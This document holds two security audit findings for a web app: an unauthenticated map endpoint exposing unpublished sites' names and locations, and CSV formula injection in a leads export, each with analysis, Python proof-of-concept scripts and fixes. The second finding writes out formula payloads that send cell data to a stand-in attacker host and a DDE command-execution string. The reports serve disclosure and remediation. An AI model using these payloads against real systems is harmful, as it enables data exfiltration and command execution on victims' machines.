title: Unauthenticated disclosure of unpublished sites in GET /api/map-sites
description: The public, unauthenticated `GET /api/map-sites` endpoint returns the business name, internal site ID, and location of every site that has a non-null `location` field, including sites that are still in private `DRAFT` or `GENERATED` status and have never been published. This exposes private business metadata of users who have not chosen to make their site public.
impact: Unauthenticated attackers can enumerate the private business metadata (business name and operating location) of every site in the system, including unpublished `DRAFT` and `GENERATED` projects. This discloses information users have not opted to make public and can be used to build targeted reconnaissance, or to identify and infer the existence of in-progress businesses before they launch.
technical_analysis:
The route handler in `app/api/map-sites/route.ts` performs a Prisma query with only one filter:

```ts
const sites = await prisma.site.findMany({
  where: { location: { not: null } },
  select: { id: true, businessName: true, location: true, createdAt: true },
  orderBy: { createdAt: "desc" },
  take: 60,
});
```

The `where` clause filters solely on `location: { not: null }`. It does **not** filter on `status`, so the query returns sites in all states: `DRAFT`, `GENERATED`, and `PUBLISHED`. In the Prisma schema, `Site.status` defaults to `DRAFT` and is only set to `PUBLISHED` when a user explicitly publishes (see `app/api/sites/[siteId]/publish/route.ts`). Every generated site with a non-null `location` therefore appears, including private drafts.

The handler also performs **no authentication or authorization** whatsoever. A search for auth helpers (`getUserBySessionToken`, `SESSION_COOKIE`, role checks, `userId` filters) at the top of the file returns nothing. The only protection is a per-IP rate limit (`consumeRateLimit("map-sites", ip, 60, ...)`), which limits volume but does not gate who can call it or what data it returns.

This means an anonymous caller can enumerate the business name, geographic location, internal site ID, and creation time of any user's private, unpublished project. The `businessName` is user-supplied and often the business's real name; `location` is where the business operates. Both are metadata the user has not opted to disclose (unlike `PUBLISHED` sites, which are intentionally public at `/s/{slug}`).
poc_description:
1. Send an unauthenticated `GET` request to `/api/map-sites`.
2. Inspect the JSON response.
3. Create a test site (either as a logged-in user or as a guest) with a `location` value that resolves to a known coordinate, but leave it unpublished (`status = DRAFT`).
4. Send the `GET /api/map-sites` request again without any session cookie.
5. Observe that the unpublished site's `businessName`, `id`, `location`, and `createdAt` are present in the anonymous response alongside published sites, confirming unauthorized disclosure of a private draft.
poc_script_code:
```python
import requests

# Unauthenticated request with no session cookie
url = "http://localhost:3000/api/map-sites"
r = requests.get(url, timeout=15)
print("status:", r.status_code)

if r.status_code == 200:
    markers = r.json()
    print("total markers returned:", len(markers))
    # Every marker leaks businessName + location for sites regardless of publish status.
    for m in markers[:5]:
        print(m)
else:
    print("unexpected response:", r.text)
```
The endpoint returns one object per site with `label` (business name), `location`, `id`, and `createdAt`. Because the route never filters by `status` nor requires a session, unpublished drafts appear in this public listing.
remediation_steps: Restrict the map listing to publicly published sites only. Add a `status: "PUBLISHED"` filter to the Prisma `where` clause so that `DRAFT` and `GENERATED` (unpublished) sites are excluded, mirroring the public-site access rules already used by the `/s/{slug}`, `/d/{domain}`, and `/api/public/sites/{slug}/...` routes. Optionally also require that the returned `PUBLISHED` sites belong to a user with an active plan when publishing is gated on it, and consider whether `businessName`/`location` should be considered public metadata at all for a map feature. Apply the same status gate consistently on any future aggregation endpoint.
evidence:
The route query filters only on `location` and never on publish status:

```ts
const sites = await prisma.site.findMany({
  where: { location: { not: null } },
  select: { id: true, businessName: true, location: true, createdAt: true },
  orderBy: { createdAt: "desc" },
  take: 60,
});
```

The `Site` schema shows `status SiteStatus @default(DRAFT)`, with `DRAFT` as the default and `PUBLISHED` set only on explicit publish, so unpublished sites are included by this query.

A search over the handler for any authentication or ownership control (`getUserBySessionToken`, `SESSION_COOKIE`, role, `userId`) returns no matches — the endpoint is fully anonymous:
assumptions: Assumes one or more sites exist with a non-null `location` and a status other than `PUBLISHED` (the default `DRAFT`, or `GENERATED`). Sites created through the normal onboarding flow can carry a `location`; the endpoint returns them regardless of whether the owner has published.

code_locations.label: Add publish-status filter to map query

fix_pr_body: This change restricts the anonymous map listing to sites that have actually been published, preventing the exposure of private business metadata (business name and location) for `DRAFT`/`GENERATED` projects. The single-line `status: "PUBLISHED"` filter mirrors the existing status gate used across the public site routes, so the map only reflects content the owner has explicitly made public.

title: CSV Formula Injection in exported leads spreadsheet
description: The leads CSV export endpoint serializes user-controlled lead fields (name, email, phone, message) without neutralizing spreadsheet formula triggers. A malicious visitor can submit a lead whose fields begin with =, +, -, or @, and when the site owner downloads and opens the exported CSV in a spreadsheet application, the injected cells are evaluated as formulas, enabling data exfiltration or further client-side attacks.
impact: A public visitor submits a crafted lead with their message or name set to a spreadsheet formula, e.g. =HYPERLINK("http://attacker.example/x?"&A1,"click") or =cmd|' /C calc'!A0. The site owner later downloads the leads CSV and opens it in Excel, LibreOffice Calc, or Google Sheets. The formula executes: cell references can be exfiltrated to an attacker-controlled server (e.g. leaking the spreadsheet's cell contents), and DDE-style payloads can trigger local command execution. The attack requires only the visit of one hostile lead and the owner opening the export in a spreadsheet client.
technical_analysis: Two routes compose the vulnerable flow: 1. **Attacker-controlled input (no filtering).** POST /api/public/sites/[slug]/leads is unauthenticated (intended for public contact forms) and stores four user-controlled fields verbatim: name, email, phone, message. The only validation is length/format (e.g. message 3-2000 chars). No check strips or escapes leading spreadsheet formula characters (=, +, -, @). 2. **Vulnerable CSV serialization (no neutralization).** GET /api/sites/[siteId]/leads/export builds CSV rows and passes every field through csvCell: ```ts title=app/api/sites/[siteId]/leads/export/route.ts function csvCell(value: string) { return `"${value.replace(/"/g, '""')}"`; } ``` This only escapes embedded double quotes. It does not prefix cells that begin with =, +, -, or @ with a neutral character (e.g. a leading apostrophe ' or tab). Consequently a field such as =HYPERLINK("http://attacker.example/?"&A1,"x") is written into the CSV verbatim. Modern spreadsheet applications import CSV and evaluate cells starting with these characters as formulas (or, for =cmd| in legacy modes, DDE payloads). The exported file is served as text/csv with a .csv attachment filename.
poc_description:
1. Visit the public URL of any published site, e.g. {{PUBLIC_SITE_BASE}}/api/public/sites//leads. 2. POST a JSON lead using the public (unauthenticated) leads endpoint with a formula-bearing field: 
{"name":"Attacker","email":"a@b.c","phone":"","message":"=HYPERLINK(\"http://attacker.example/leak?val=\"&B2,\"click\")"}
3. The lead is stored verbatim (only length/format checks apply). 4. As the site owner, call GET /api/sites//leads/export to download the CSV. 5. Open the resulting .csv in Excel, LibreOffice Calc, or Google Sheets and observe that the message cell is evaluated as a formula (external request fired to the attacker's URL / hyperlink activated) rather than rendered as literal text.
poc_script_code:
```python
import requests

# 1) Public, unauthenticated lead submission with a formula-bear payload
base = "https://APP_BASE"  # replace with the deployed app origin
slug = "target-site"       # a published site's publicSlug

lead = {
    "name": "Attacker",
    "email": "attacker@example.com",
    "phone": "",
    "message": '=HYPERLINK("http://attacker.example/leak?val="&B2,"click")',
}
r = requests.post(f"{base}/api/public/sites/{slug}/leads", json=lead)
assert r.status_code == 201, r.text

# 2) The owner (authenticated session cookie) downloads the export CSV.
cookies = {"__cluster_session": "<owner-session-token>"}
resp = requests.get(f"{base}/api/sites/<siteId>/leads/export", cookies=cookies)
csv = resp.content.decode("utf-8-sig")

# 3) Confirm the formula survived serialization un-neutralized.
assert '=HYPERLINK("http://attacker.example/leak?val="&B2,"click")' in csv
print("Formula cell present in exported CSV -> CSV Formula Injection confirmed")
print(csv)
```
remediation_steps: Update the CSV cell serializer to neutralize cells whose value begins with a spreadsheet formula trigger (`=`, `+`, `-`, or `@`) by prefixing a single apostrophe (`'`) so spreadsheet clients render the value as literal text instead of evaluating it. Reject or strip formula-triggering leading characters at the public leads input schema as defense in depth. Ensure the fix applies to all lead fields included in the export (name, email, phone, message).
evidence: The exact csvCell serializer reproduced against the lead fields yields an un-neutralized formula cell. Generated CSV excerpt: ```csv "Nombre","Email","Teléfono","Mensaje","Fecha" "Attacker","","","=HYPERLINK(""http://attacker.example/leak?val=""&B2,""click"")","2026-08-10T00:00:00.000Z" ``` The message cell is preceded by no neutralization character (only the CSV quoting wrapper), so spreadsheet clients interpret it as a formula. The source line function csvCell(value: string) { return `"${value.replace(/"/g, '""')}"`; } confirms only embedded quotes are escaped; formula triggers are preserved.
assumptions: Assumes the site owner downloads and opens the exported leads CSV in a spreadsheet application (Excel, LibreOffice Calc, or Google Sheets) rather than a text editor. This is the intended use of the export feature. Also assumes the attacker has network reachability to a host they control to observe the exfiltration request.

code_locations.label: Neutralize formula triggers in csvCell before writing cells

fix_pr_body:
## Fix

The `csvCell` serializer only escaped embedded double quotes and left spreadsheet formula-trigger characters (`=`, `+`, `-`, `@`) untouched, so user-controlled lead fields could be evaluated as formulas when the export was opened in Excel/Calc/Sheets.

First, the fix prepends a neutral apostrophe to any cell that begins with a formula-triggering character. This prevents the spreadsheet application from interpreting the cell as a formula while preserving the original text that the owner sees. (Example: `=HYPERLINK("...")` becomes `'=HYPERLINK("...")`.)

Note: defense in depth is also recommended on the input side — the public leads endpoint should normalize/strip leading formula characters before storage, and the export could additionally prefix a tab/carriage-return neutralizer. This change addresses the serialization sink directly, which is the authoritative fix for the export path.
